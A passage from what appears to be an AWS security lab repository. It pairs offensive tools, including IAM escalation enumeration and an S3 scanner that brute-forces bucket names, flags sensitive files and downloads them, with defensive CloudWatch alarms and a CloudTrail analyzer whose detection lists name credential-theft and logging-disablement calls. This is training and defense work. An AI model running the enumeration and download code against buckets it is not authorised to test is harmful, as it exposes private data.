        table.add_column("Severity", style="red")
        table.add_column("Technique", style="green")
        
        for path in escalation_paths:
            table.add_row(
                path['permission'][:30],
                path['method'],
                path['severity'],
                path['technique'][:40]
            )
        
        console.print(table)
    else:
        console.print("  [green]No obvious escalation paths found[/]")
    
    # Check assumable roles
    console.print("\n[bold cyan]4. Assumable Roles[/]")
    console.print("-" * 40)
    
    assumable_roles = enumerator.check_assumable_roles()
    
    if assumable_roles:
        for role in assumable_roles:
            console.print(f"  [red]⚠ {role['role_name']}[/]")
            console.print(f"    Vulnerability: {role['vulnerability']}")
            console.print(f"    ARN: {role['role_arn']}")
    else:
        console.print("  [green]No easily assumable roles found[/]")
    
    # Check dangerous policies
    console.print("\n[bold cyan]5. Dangerous Policies[/]")
    console.print("-" * 40)
    
    dangerous = enumerator.check_dangerous_policies()
    
    if dangerous:
        for policy in dangerous:
            console.print(f"  [red]⚠ {policy['policy_name']}[/]")
            console.print(f"    Issue: {policy['issue']}")
    else:
        console.print("  [green]No obviously dangerous policies found[/]")
    
    console.print("\n[bold green]Enumeration complete![/]")


if __name__ == "__main__":
    main()

```

## File: `penetration-testing\s3-enumeration\s3_enum.py`
```python
"""
S3 Bucket Enumeration & Exploitation
=====================================
Penetration testing tool for discovering and exploiting S3 misconfigurations.

ATTACK TECHNIQUES:
1. Bucket enumeration - Find exposed buckets
2. ACL analysis - Check permissions
3. Content discovery - Find sensitive files
4. Data exfiltration - Download exposed data
"""

import boto3
import requests
import json
import sys
import os
from botocore.exceptions import ClientError
from concurrent.futures import ThreadPoolExecutor

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()


class S3Enumerator:
    """S3 Bucket enumeration and exploitation tool"""
    
    def __init__(self):
        self.s3_client = boto3.client('s3', region_name=config.AWS_REGION)
        self.s3_resource = boto3.resource('s3', region_name=config.AWS_REGION)
        self.findings = []
    
    def check_bucket_exists(self, bucket_name):
        """Check if a bucket exists and is accessible"""
        try:
            self.s3_client.head_bucket(Bucket=bucket_name)
            return True, "Exists and accessible"
        except ClientError as e:
            error_code = e.response.get('Error', {}).get('Code', '')
            if error_code == '404':
                return False, "Does not exist"
            elif error_code == '403':
                return True, "Exists but access denied"
            else:
                return False, f"Error: {error_code}"
    
    def check_public_access(self, bucket_name):
        """Check if bucket allows public access"""
        findings = []
        
        try:
            # Check public access block
            pab = self.s3_client.get_public_access_block(Bucket=bucket_name)
            config_data = pab.get('PublicAccessBlockConfiguration', {})
            
            if not config_data.get('BlockPublicAcls', True):
                findings.append("CRITICAL: BlockPublicAcls is FALSE")
            if not config_data.get('BlockPublicPolicy', True):
                findings.append("CRITICAL: BlockPublicPolicy is FALSE")
            if not config_data.get('IgnorePublicAcls', True):
                findings.append("CRITICAL: IgnorePublicAcls is FALSE")
            if not config_data.get('RestrictPublicBuckets', True):
                findings.append("CRITICAL: RestrictPublicBuckets is FALSE")
                
        except ClientError as e:
            if 'NoSuchPublicAccessBlockConfiguration' in str(e):
                findings.append("CRITICAL: No public access block configured!")
            else:
                findings.append(f"Could not check: {e}")
        
        return findings
    
    def check_bucket_acl(self, bucket_name):
        """Analyze bucket ACL for misconfigurations"""
        findings = []
        
        try:
            acl = self.s3_client.get_bucket_acl(Bucket=bucket_name)
            
            for grant in acl.get('Grants', []):
                grantee = grant.get('Grantee', {})
                permission = grant.get('Permission', '')
                
                # Check for public access
                if grantee.get('URI') == 'http://acs.amazonaws.com/groups/global/AllUsers':
                    findings.append(f"CRITICAL: Public ({permission}) - Anyone can access!")
                elif grantee.get('URI') == 'http://acs.amazonaws.com/groups/global/AuthenticatedUsers':
                    findings.append(f"HIGH: AuthenticatedUsers ({permission}) - Any AWS account!")
                    
        except ClientError as e:
            findings.append(f"ACL check failed: {e}")
        
        return findings
    
    def check_bucket_policy(self, bucket_name):
        """Analyze bucket policy for dangerous permissions"""
        findings = []
        
        try:
            policy = self.s3_client.get_bucket_policy(Bucket=bucket_name)
            policy_doc = json.loads(policy['Policy'])
            
            for statement in policy_doc.get('Statement', []):
                principal = statement.get('Principal', '')
                effect = statement.get('Effect', '')
                actions = statement.get('Action', [])
                
                if isinstance(actions, str):
                    actions = [actions]
                
                # Check for public access
                if principal == '*' or principal == {'AWS': '*'}:
                    if effect == 'Allow':
                        for action in actions:
                            findings.append(f"CRITICAL: Public access allowed - {action}")
                            
        except ClientError as e:
            if 'NoSuchBucketPolicy' in str(e):
                findings.append("INFO: No bucket policy (using ACLs only)")
            else:
                findings.append(f"Policy check failed: {e}")
        
        return findings
    
    def list_bucket_contents(self, bucket_name, max_keys=100):
        """List objects in the bucket"""
        objects = []
        
        try:
            response = self.s3_client.list_objects_v2(
                Bucket=bucket_name,
                MaxKeys=max_keys
            )
            
            for obj in response.get('Contents', []):
                objects.append({
                    'Key': obj['Key'],
                    'Size': obj['Size'],
                    'LastModified': str(obj['LastModified'])
                })
                
        except ClientError as e:
            console.print(f"  [red]Cannot list objects:[/] {e}")
        
        return objects
    
    def check_sensitive_files(self, bucket_name, objects):
        """Identify potentially sensitive files"""
        sensitive_patterns = [
            'credential', 'password', 'secret', 'key', 'token',
            'config', 'env', 'backup', 'dump', 'private',
            '.pem', '.key', '.pfx', '.p12', '.sql', '.bak'
        ]
        
        findings = []
        for obj in objects:
            key_lower = obj['Key'].lower()
            for pattern in sensitive_patterns:
                if pattern in key_lower:
                    findings.append({
                        'file': obj['Key'],
                        'pattern': pattern,
                        'size': obj['Size']
                    })
                    break
        
        return findings
    
    def download_file(self, bucket_name, key, local_path):
        """Download a file from the bucket"""
        try:
            os.makedirs(os.path.dirname(local_path) or '.', exist_ok=True)
            self.s3_client.download_file(bucket_name, key, local_path)
            return True
        except Exception as e:
            console.print(f"  [red]Download failed:[/] {e}")
            return False
    
    def check_cors(self, bucket_name):
        """Check CORS configuration"""
        findings = []
        
        try:
            cors = self.s3_client.get_bucket_cors(Bucket=bucket_name)
            
            for rule in cors.get('CORSRules', []):
                origins = rule.get('AllowedOrigins', [])
                methods = rule.get('AllowedMethods', [])
                
                if '*' in origins:
                    findings.append(f"HIGH: AllowedOrigins contains * (any website)")
                if 'DELETE' in methods or 'PUT' in methods:
                    findings.append(f"MEDIUM: Allows {methods} methods via CORS")
                    
        except ClientError as e:
            if 'NoSuchCORSConfiguration' in str(e):
                findings.append("INFO: No CORS configuration")
            else:
                findings.append(f"Error: {e}")
        
        return findings
    
    def check_encryption(self, bucket_name):
        """Check if server-side encryption is enabled"""
        try:
            enc = self.s3_client.get_bucket_encryption(Bucket=bucket_name)
            rules = enc.get('ServerSideEncryptionConfiguration', {}).get('Rules', [])
            if rules:
                return "INFO: Encryption enabled"
            return "HIGH: Encryption not properly configured"
        except ClientError as e:
            if 'ServerSideEncryptionConfigurationNotFoundError' in str(e):
                return "HIGH: No server-side encryption!"
            return f"Error: {e}"
    
    def check_versioning(self, bucket_name):
        """Check if versioning is enabled"""
        try:
            versioning = self.s3_client.get_bucket_versioning(Bucket=bucket_name)
            status = versioning.get('Status', 'Disabled')
            if status == 'Enabled':
                return "INFO: Versioning enabled"
            return "MEDIUM: Versioning not enabled (data loss risk)"
        except ClientError as e:
            return f"Error: {e}"
    
    def full_scan(self, bucket_name):
        """Perform a comprehensive security scan on a bucket"""
        results = {
            'bucket': bucket_name,
            'exists': False,
            'findings': [],
            'objects': [],
            'sensitive_files': []
        }
        
        console.print(f"\n[bold cyan]Scanning bucket:[/] {bucket_name}")
        console.print("-" * 50)
        
        # Check existence
        exists, status = self.check_bucket_exists(bucket_name)
        results['exists'] = exists
        console.print(f"  Status: {status}")
        
        if not exists:
            return results
        
        # Public access checks
        console.print("\n  [bold]Checking Public Access...[/]")
        public_findings = self.check_public_access(bucket_name)
        for f in public_findings:
            console.print(f"    [yellow]• {f}[/]")
            results['findings'].append(f)
        
        # ACL check
        console.print("\n  [bold]Checking ACL...[/]")
        acl_findings = self.check_bucket_acl(bucket_name)
        for f in acl_findings:
            console.print(f"    [yellow]• {f}[/]")
            results['findings'].append(f)
        
        # Policy check
        console.print("\n  [bold]Checking Bucket Policy...[/]")
        policy_findings = self.check_bucket_policy(bucket_name)
        for f in policy_findings:
            console.print(f"    [yellow]• {f}[/]")
            results['findings'].append(f)
        
        # CORS check
        console.print("\n  [bold]Checking CORS...[/]")
        cors_findings = self.check_cors(bucket_name)
        for f in cors_findings:
            console.print(f"    [yellow]• {f}[/]")
            results['findings'].append(f)
        
        # Encryption check
        console.print("\n  [bold]Checking Encryption...[/]")
        enc_status = self.check_encryption(bucket_name)
        console.print(f"    [yellow]• {enc_status}[/]")
        results['findings'].append(enc_status)
        
        # Versioning check
        console.print("\n  [bold]Checking Versioning...[/]")
        ver_status = self.check_versioning(bucket_name)
        console.print(f"    [yellow]• {ver_status}[/]")
        results['findings'].append(ver_status)
        
        # List objects
        console.print("\n  [bold]Listing Objects...[/]")
        objects = self.list_bucket_contents(bucket_name)
        results['objects'] = objects
        console.print(f"    Found {len(objects)} objects")
        
        # Check for sensitive files
        if objects:
            console.print("\n  [bold]Checking for Sensitive Files...[/]")
            sensitive = self.check_sensitive_files(bucket_name, objects)
            results['sensitive_files'] = sensitive
            for s in sensitive:
                console.print(f"    [red]⚠ SENSITIVE: {s['file']} (matched: {s['pattern']})[/]")
        
        return results


def brute_force_buckets(wordlist):
    """Brute force bucket names from a wordlist"""
    console.print("\n[bold cyan]Brute Forcing Bucket Names...[/]")
    
    found_buckets = []
    enumerator = S3Enumerator()
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("Checking buckets...", total=len(wordlist))
        
        for name in wordlist:
            exists, status = enumerator.check_bucket_exists(name)
            if exists:
                found_buckets.append({'name': name, 'status': status})
                console.print(f"  [green]✓ Found:[/] {name} - {status}")
            progress.advance(task)
    
    return found_buckets


def main():
    console.print(Panel.fit(
        "[bold cyan]🔍 S3 BUCKET ENUMERATION & EXPLOITATION 🔍[/]\n\n"
        "This tool scans S3 buckets for security misconfigurations:\n"
        "• Public access settings\n"
        "• ACL misconfigurations\n"
        "• Dangerous bucket policies\n"
        "• Sensitive file exposure\n"
        "• Encryption & versioning status",
        title="Penetration Testing Tool"
    ))
    
    enumerator = S3Enumerator()
    
    # Scan lab buckets
    lab_buckets = [
        config.S3_PUBLIC_BUCKET,
        config.S3_UNENCRYPTED_BUCKET,
        config.S3_NO_VERSIONING_BUCKET,
        config.S3_CORS_BUCKET,
        config.S3_SECURE_BUCKET
    ]
    
    all_results = []
    
    for bucket in lab_buckets:
        results = enumerator.full_scan(bucket)
        all_results.append(results)
    
    # Summary table
    console.print("\n" + "="*60)
    console.print("[bold]SCAN SUMMARY[/]")
    console.print("="*60)
    
    table = Table(title="Bucket Security Assessment")
    table.add_column("Bucket", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("Critical", style="red")
    table.add_column("High", style="yellow")
    table.add_column("Sensitive Files", style="magenta")
    
    for result in all_results:
        if result['exists']:
            critical = len([f for f in result['findings'] if 'CRITICAL' in f])
            high = len([f for f in result['findings'] if 'HIGH' in f])
            sensitive = len(result['sensitive_files'])
            table.add_row(
                result['bucket'][:30] + '...' if len(result['bucket']) > 30 else result['bucket'],
                "Accessible",
                str(critical),
                str(high),
                str(sensitive)
            )
    
    console.print(table)
    
    # Exploitation options
    console.print("\n[bold yellow]EXPLOITATION OPTIONS:[/]")
    console.print("1. Download sensitive files from public buckets")
    console.print("2. Upload files to writable buckets")
    console.print("3. Exfiltrate data via CORS-enabled buckets")
    
    console.print("\n[bold green]Scan complete![/]")


if __name__ == "__main__":
    main()

```

## File: `soc-defense\alerting-rules\cloudwatch_alerts.json`
```json
{
    "Description": "CloudWatch alarms for AWS security monitoring",
    "Version": "1.0",
    "Alarms": [
        {
            "Name": "RootAccountUsage",
            "Description": "Alert when root account is used",
            "MetricName": "RootAccountUsageCount",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "Critical",
            "FilterPattern": "{ $.userIdentity.type = \"Root\" && $.userIdentity.invokedBy NOT EXISTS && $.eventType != \"AwsServiceEvent\" }"
        },
        {
            "Name": "UnauthorizedAPICalls",
            "Description": "Alert on unauthorized API attempts",
            "MetricName": "UnauthorizedAPICalls",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 5,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "High",
            "FilterPattern": "{ ($.errorCode = \"*UnauthorizedAccess*\") || ($.errorCode = \"AccessDenied*\") }"
        },
        {
            "Name": "ConsoleLoginWithoutMFA",
            "Description": "Alert on console login without MFA",
            "MetricName": "ConsoleLoginWithoutMFA",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "High",
            "FilterPattern": "{ ($.eventName = \"ConsoleLogin\") && ($.additionalEventData.MFAUsed != \"Yes\") }"
        },
        {
            "Name": "IAMPolicyChanges",
            "Description": "Alert on IAM policy modifications",
            "MetricName": "IAMPolicyChanges",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "Medium",
            "FilterPattern": "{ ($.eventName = CreatePolicy) || ($.eventName = DeletePolicy) || ($.eventName = CreatePolicyVersion) || ($.eventName = DeletePolicyVersion) || ($.eventName = AttachRolePolicy) || ($.eventName = DetachRolePolicy) || ($.eventName = AttachUserPolicy) || ($.eventName = DetachUserPolicy) || ($.eventName = AttachGroupPolicy) || ($.eventName = DetachGroupPolicy) }"
        },
        {
            "Name": "CloudTrailConfigChanges",
            "Description": "Alert on CloudTrail configuration changes",
            "MetricName": "CloudTrailChanges",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "Critical",
            "FilterPattern": "{ ($.eventName = CreateTrail) || ($.eventName = UpdateTrail) || ($.eventName = DeleteTrail) || ($.eventName = StartLogging) || ($.eventName = StopLogging) }"
        },
        {
            "Name": "SecurityGroupChanges",
            "Description": "Alert on security group modifications",
            "MetricName": "SecurityGroupChanges",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "High",
            "FilterPattern": "{ ($.eventName = AuthorizeSecurityGroupIngress) || ($.eventName = AuthorizeSecurityGroupEgress) || ($.eventName = RevokeSecurityGroupIngress) || ($.eventName = RevokeSecurityGroupEgress) || ($.eventName = CreateSecurityGroup) || ($.eventName = DeleteSecurityGroup) }"
        },
        {
            "Name": "S3BucketPolicyChanges",
            "Description": "Alert on S3 bucket policy changes",
            "MetricName": "S3BucketPolicyChanges",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "High",
            "FilterPattern": "{ ($.eventSource = s3.amazonaws.com) && (($.eventName = PutBucketAcl) || ($.eventName = PutBucketPolicy) || ($.eventName = PutBucketCors) || ($.eventName = PutBucketLifecycle) || ($.eventName = PutBucketReplication) || ($.eventName = DeleteBucketPolicy) || ($.eventName = DeleteBucketCors) || ($.eventName = DeleteBucketLifecycle) || ($.eventName = DeleteBucketReplication)) }"
        },
        {
            "Name": "NetworkACLChanges",
            "Description": "Alert on Network ACL changes",
            "MetricName": "NetworkACLChanges",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "Medium",
            "FilterPattern": "{ ($.eventName = CreateNetworkAcl) || ($.eventName = CreateNetworkAclEntry) || ($.eventName = DeleteNetworkAcl) || ($.eventName = DeleteNetworkAclEntry) || ($.eventName = ReplaceNetworkAclEntry) || ($.eventName = ReplaceNetworkAclAssociation) }"
        },
        {
            "Name": "NewAccessKeyCreated",
            "Description": "Alert when new access keys are created",
            "MetricName": "NewAccessKeyCreated",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 300,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "High",
            "FilterPattern": "{ $.eventName = CreateAccessKey }"
        },
        {
            "Name": "GuardDutyDisabled",
            "Description": "Critical alert when GuardDuty is disabled",
            "MetricName": "GuardDutyDisabled",
            "Namespace": "CloudTrailMetrics",
            "Statistic": "Sum",
            "Period": 60,
            "EvaluationPeriods": 1,
            "Threshold": 1,
            "ComparisonOperator": "GreaterThanOrEqualToThreshold",
            "Severity": "Critical",
            "FilterPattern": "{ ($.eventSource = guardduty.amazonaws.com) && (($.eventName = DeleteDetector) || ($.eventName = DisableOrganizationAdminAccount)) }"
        }
    ]
}

```

## File: `soc-defense\alerting-rules\setup_alerts.py`
```python
"""
CloudWatch Alerting Setup
=========================
Deploys CloudWatch metric filters and alarms based on alert definitions.
"""

import boto3
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class AlertingSetup:
    """Sets up CloudWatch alerting infrastructure"""
    
    def __init__(self):
        self.logs = boto3.client('logs', region_name=config.AWS_REGION)
        self.cloudwatch = boto3.client('cloudwatch', region_name=config.AWS_REGION)
        self.sns = boto3.client('sns', region_name=config.AWS_REGION)
    
    def load_alert_definitions(self, file_path):
        """Load alert definitions from JSON file"""
        with open(file_path, 'r') as f:
            return json.load(f)
    
    def create_metric_filter(self, log_group, alarm_def):
        """Create CloudWatch metric filter"""
        try:
            self.logs.put_metric_filter(
                logGroupName=log_group,
                filterName=alarm_def['Name'],
                filterPattern=alarm_def['FilterPattern'],
                metricTransformations=[{
                    'metricName': alarm_def['MetricName'],
                    'metricNamespace': alarm_def['Namespace'],
                    'metricValue': '1',
                    'defaultValue': 0
                }]
            )
            return True
        except Exception as e:
            console.print(f"  [red]Error creating filter {alarm_def['Name']}:[/] {e}")
            return False
    
    def create_alarm(self, alarm_def, sns_topic_arn=None):
        """Create CloudWatch alarm"""
        try:
            alarm_params = {
                'AlarmName': f"SecurityLab-{alarm_def['Name']}",
                'AlarmDescription': alarm_def['Description'],
                'MetricName': alarm_def['MetricName'],
                'Namespace': alarm_def['Namespace'],
                'Statistic': alarm_def['Statistic'],
                'Period': alarm_def['Period'],
                'EvaluationPeriods': alarm_def['EvaluationPeriods'],
                'Threshold': alarm_def['Threshold'],
                'ComparisonOperator': alarm_def['ComparisonOperator'],
                'TreatMissingData': 'notBreaching',
                'Tags': [
                    {'Key': 'Severity', 'Value': alarm_def['Severity']},
                    {'Key': 'Project', 'Value': 'aws-security-lab'}
                ]
            }
            
            if sns_topic_arn:
                alarm_params['AlarmActions'] = [sns_topic_arn]
                alarm_params['OKActions'] = [sns_topic_arn]
            
            self.cloudwatch.put_metric_alarm(**alarm_params)
            return True
        except Exception as e:
            console.print(f"  [red]Error creating alarm {alarm_def['Name']}:[/] {e}")
            return False
    
    def get_or_create_sns_topic(self):
        """Get or create SNS topic for alerts"""
        topic_name = f"{config.LAB_PREFIX}-security-alerts"
        
        try:
            # Check if topic exists
            topics = self.sns.list_topics()
            for topic in topics.get('Topics', []):
                if topic_name in topic['TopicArn']:
                    return topic['TopicArn']
            
            # Create new topic
            response = self.sns.create_topic(Name=topic_name)
            return response['TopicArn']
        except Exception as e:
            console.print(f"[red]Error with SNS topic:[/] {e}")
            return None
    
    def deploy_all_alerts(self, alerts_file, log_group):
        """Deploy all alert definitions"""
        console.print(Panel.fit(
            "[bold cyan]🚨 DEPLOYING SECURITY ALERTS 🚨[/]\n\n"
            "Setting up CloudWatch metric filters and alarms\n"
            "for security monitoring.",
            title="Alerting Setup"
        ))
        
        # Load definitions
        definitions = self.load_alert_definitions(alerts_file)
        alarms = definitions.get('Alarms', [])
        
        console.print(f"\n[cyan]Found {len(alarms)} alert definitions[/]")
        
        # Get SNS topic
        sns_arn = self.get_or_create_sns_topic()
        if sns_arn:
            console.print(f"[green]SNS Topic:[/] {sns_arn}")
        
        # Deploy each alert
        results = {'filters': 0, 'alarms': 0, 'errors': 0}
        
        for alarm_def in alarms:
            console.print(f"\n[bold]{alarm_def['Name']}[/]")
            
            # Create metric filter
            if self.create_metric_filter(log_group, alarm_def):
                console.print(f"  [green]✓[/] Metric filter created")
                results['filters'] += 1
            else:
                results['errors'] += 1
            
            # Create alarm
            if self.create_alarm(alarm_def, sns_arn):
                console.print(f"  [green]✓[/] Alarm created")
                results['alarms'] += 1
            else:
                results['errors'] += 1
        
        # Summary
        console.print("\n" + "="*40)
        console.print("[bold]Deployment Summary[/]")
        console.print(f"  Metric Filters: {results['filters']}")
        console.print(f"  Alarms: {results['alarms']}")
        console.print(f"  Errors: {results['errors']}")


def main():
    setup = AlertingSetup()
    
    # Get path to alerts file
    alerts_file = os.path.join(os.path.dirname(__file__), 'cloudwatch_alerts.json')
    
    # Deploy alerts
    setup.deploy_all_alerts(alerts_file, config.CLOUDWATCH_LOG_GROUP)
    
    console.print("\n[bold green]Alerting setup complete![/]")
    console.print("[yellow]Note: Subscribe to the SNS topic to receive email alerts.[/]")


if __name__ == "__main__":
    main()

```

## File: `soc-defense\log-analysis\log_analyzer.py`
```python
"""
CloudTrail Log Analyzer
========================
SOC tool for analyzing AWS CloudTrail logs and detecting suspicious activity.

DETECTION CAPABILITIES:
1. Unauthorized API calls
2. Console logins from unusual locations
3. Security group modifications
4. IAM policy changes
5. S3 bucket policy changes
6. Root account usage
"""

import boto3
import json
import gzip
import sys
import os
from datetime import datetime, timedelta
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress

console = Console()


# Suspicious event patterns
SUSPICIOUS_EVENTS = {
    # IAM Events
    'CreateUser': {'severity': 'Medium', 'category': 'IAM', 'description': 'New user created'},
    'CreateAccessKey': {'severity': 'High', 'category': 'IAM', 'description': 'Access key created'},
    'AttachUserPolicy': {'severity': 'High', 'category': 'IAM', 'description': 'Policy attached to user'},
    'AttachRolePolicy': {'severity': 'High', 'category': 'IAM', 'description': 'Policy attached to role'},
    'PutUserPolicy': {'severity': 'High', 'category': 'IAM', 'description': 'Inline policy added to user'},
    'DeleteAccessKey': {'severity': 'Medium', 'category': 'IAM', 'description': 'Access key deleted'},
    'UpdateAssumeRolePolicy': {'severity': 'Critical', 'category': 'IAM', 'description': 'Role trust policy modified'},
    
    # S3 Events
    'PutBucketPolicy': {'severity': 'High', 'category': 'S3', 'description': 'Bucket policy modified'},
    'DeleteBucketPolicy': {'severity': 'Medium', 'category': 'S3', 'description': 'Bucket policy deleted'},
    'PutBucketAcl': {'severity': 'High', 'category': 'S3', 'description': 'Bucket ACL modified'},
    'PutBucketPublicAccessBlock': {'severity': 'High', 'category': 'S3', 'description': 'Public access settings changed'},
    
    # EC2 Events
    'AuthorizeSecurityGroupIngress': {'severity': 'High', 'category': 'EC2', 'description': 'Security group rule added'},
    'AuthorizeSecurityGroupEgress': {'severity': 'Medium', 'category': 'EC2', 'description': 'Egress rule added'},
    'RunInstances': {'severity': 'Medium', 'category': 'EC2', 'description': 'EC2 instance launched'},
    'StopInstances': {'severity': 'Low', 'category': 'EC2', 'description': 'EC2 instance stopped'},
    'TerminateInstances': {'severity': 'Medium', 'category': 'EC2', 'description': 'EC2 instance terminated'},
    
    # CloudTrail Events
    'StopLogging': {'severity': 'Critical', 'category': 'CloudTrail', 'description': 'CloudTrail logging stopped!'},
    'DeleteTrail': {'severity': 'Critical', 'category': 'CloudTrail', 'description': 'CloudTrail deleted!'},
    'UpdateTrail': {'severity': 'High', 'category': 'CloudTrail', 'description': 'CloudTrail configuration changed'},
    
    # Console Access
    'ConsoleLogin': {'severity': 'Info', 'category': 'Access', 'description': 'Console login'},
    
    # GuardDuty
    'DisableGuardDuty': {'severity': 'Critical', 'category': 'Security', 'description': 'GuardDuty disabled!'},
    'DeleteDetector': {'severity': 'Critical', 'category': 'Security', 'description': 'GuardDuty detector deleted!'},
}

# Known attack patterns
ATTACK_PATTERNS = {
    'credential_theft': [
        'GetSecretValue', 'GetParametersByPath', 'GetParameters',
        'ListSecrets', 'DescribeSecret'
    ],
    'reconnaissance': [
        'ListUsers', 'ListRoles', 'ListPolicies', 'ListBuckets',
        'DescribeInstances', 'GetAccountAuthorizationDetails'
    ],
    'privilege_escalation': [
        'AttachUserPolicy', 'AttachRolePolicy', 'PutUserPolicy',
        'PutRolePolicy', 'CreatePolicyVersion', 'SetDefaultPolicyVersion'
    ],
    'persistence': [
        'CreateUser', 'CreateAccessKey', 'CreateLoginProfile',
        'CreateRole', 'UpdateAssumeRolePolicy'
    ],
    'defense_evasion': [
        'StopLogging', 'DeleteTrail', 'DeleteFlowLogs',
        'DisableGuardDuty', 'DeleteDetector'
    ]
}


class CloudTrailAnalyzer:
    """Analyzes CloudTrail logs for security threats"""
    
    def __init__(self):
        self.cloudtrail = boto3.client('cloudtrail', region_name=config.AWS_REGION)
        self.s3 = boto3.client('s3', region_name=config.AWS_REGION)
        self.findings = []
        self.event_stats = defaultdict(int)
        self.user_activity = defaultdict(list)
    
    def lookup_recent_events(self, hours=24, max_results=1000):
        """Query CloudTrail for recent events"""
        console.print(f"\n[bold cyan]Querying CloudTrail events (last {hours} hours)...[/]")
        
        start_time = datetime.utcnow() - timedelta(hours=hours)
        events = []
        
        try:
            paginator = self.cloudtrail.get_paginator('lookup_events')
            
            for page in paginator.paginate(
                StartTime=start_time,
                EndTime=datetime.utcnow(),
                MaxResults=min(max_results, 50)
            ):
                for event in page.get('Events', []):
                    events.append(event)
                    if len(events) >= max_results:
                        break
                if len(events) >= max_results:
                    break
            
            console.print(f"  [green]Retrieved {len(events)} events[/]")
            return events
            
        except Exception as e:
            console.print(f"  [red]Error querying CloudTrail:[/] {e}")
            return []
    
    def parse_event(self, event):
        """Parse CloudTrail event into structured format"""
        try:
            cloud_trail_event = json.loads(event.get('CloudTrailEvent', '{}'))
            return {
                'event_id': event.get('EventId'),
                'event_name': event.get('EventName'),
                'event_time': event.get('EventTime'),
                'username': event.get('Username', 'Unknown'),
                'event_source': cloud_trail_event.get('eventSource', ''),
                'source_ip': cloud_trail_event.get('sourceIPAddress', ''),
                'user_agent': cloud_trail_event.get('userAgent', ''),
                'error_code': cloud_trail_event.get('errorCode'),
                'error_message': cloud_trail_event.get('errorMessage'),
                'request_params': cloud_trail_event.get('requestParameters', {}),
                'response_elements': cloud_trail_event.get('responseElements', {}),
                'user_identity': cloud_trail_event.get('userIdentity', {}),
                'raw': cloud_trail_event
            }
        except:
            return None
    
    def analyze_event(self, parsed_event):
        """Analyze a single event for suspicious activity"""
        event_name = parsed_event['event_name']
        findings = []
        
        # Check against known suspicious events
        if event_name in SUSPICIOUS_EVENTS:
            info = SUSPICIOUS_EVENTS[event_name]
            findings.append({
                'type': 'suspicious_event',
                'event_name': event_name,
                'severity': info['severity'],
                'category': info['category'],
                'description': info['description'],
                'username': parsed_event['username'],
                'source_ip': parsed_event['source_ip'],
                'time': parsed_event['event_time']
            })
        
        # Check for failed API calls (potential reconnaissance)
        if parsed_event['error_code']:
            if parsed_event['error_code'] in ['AccessDenied', 'UnauthorizedAccess']:
                findings.append({
                    'type': 'access_denied',
                    'event_name': event_name,
                    'severity': 'Medium',
                    'category': 'Reconnaissance',
                    'description': f"Access denied: {parsed_event['error_message']}",
                    'username': parsed_event['username'],
                    'source_ip': parsed_event['source_ip'],
                    'time': parsed_event['event_time']
                })
        
        # Check for root account usage
        user_identity = parsed_event['user_identity']
        if user_identity.get('type') == 'Root':
            findings.append({
                'type': 'root_activity',
                'event_name': event_name,
                'severity': 'Critical',
                'category': 'Access',
                'description': 'Root account activity detected!',
                'username': 'Root',
                'source_ip': parsed_event['source_ip'],
                'time': parsed_event['event_time']
            })
        
        # Check for console login without MFA
        if event_name == 'ConsoleLogin':
            additional_data = parsed_event['raw'].get('additionalEventData', {})
            if not additional_data.get('MFAUsed') == 'Yes':
                findings.append({
                    'type': 'no_mfa',
                    'event_name': event_name,
                    'severity': 'High',
                    'category': 'Access',
                    'description': 'Console login without MFA!',
                    'username': parsed_event['username'],
                    'source_ip': parsed_event['source_ip'],
                    'time': parsed_event['event_time']
                })
        
        return findings
    
    def detect_attack_patterns(self, events):
        """Detect attack patterns from event sequences"""
        console.print("\n[bold cyan]Detecting Attack Patterns...[/]")
        
        # Group events by user
        user_events = defaultdict(list)
        for event in events:
            parsed = self.parse_event(event)
            if parsed:
                user_events[parsed['username']].append(parsed['event_name'])
        
        pattern_findings = []
        
        for username, event_names in user_events.items():
            event_set = set(event_names)
            
            for pattern_name, pattern_events in ATTACK_PATTERNS.items():
                matches = event_set.intersection(set(pattern_events))
                if len(matches) >= 2:  # At least 2 matching events
                    pattern_findings.append({
